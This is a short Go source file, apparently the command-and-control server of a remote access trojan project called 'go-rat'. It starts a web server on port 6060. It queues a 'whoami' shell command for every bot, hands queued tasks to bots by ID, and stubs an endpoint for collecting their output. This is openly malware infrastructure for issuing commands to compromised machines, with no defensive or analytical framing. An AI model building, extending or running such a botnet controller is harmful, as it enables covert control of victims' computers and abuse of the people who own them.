package main

import (
	"errors"
	"fmt"
	"go-rat/utils/types"
	"net/http"
	"os"

	"github.com/labstack/echo/v4"
)

func main() {
	// Init db
	InitDB()

	// Create some test DB data
	_, err := CreateTask("command", []string{"*"}, types.Parameter{Name: "command", Value: "whoami"})
	if err != nil {
		fmt.Println("Error creating task. " + err.Error())
		os.Exit(1)
	}

	// Init server
	e := echo.New()
	e.HideBanner = true

	// Routes
	e.GET("/", func(c echo.Context) error {
		return c.String(http.StatusOK, "Hello, World!")
	})

	e.GET("/get/tasks/:bot_id", func(c echo.Context) error {
		tasks, err := LoadTasks(c.Param("bot_id"))
		if err != nil {
			return c.JSON(http.StatusNotFound, []types.Task{})
		}
		return c.JSON(http.StatusOK, tasks)
	})

	e.POST("/output/task/:task_id", func(c echo.Context) error {
		return c.JSON(http.StatusOK, types.Error{Namespace: "api", Err: errors.New("unimplemented")})
	})

	e.Start(":6060")
}
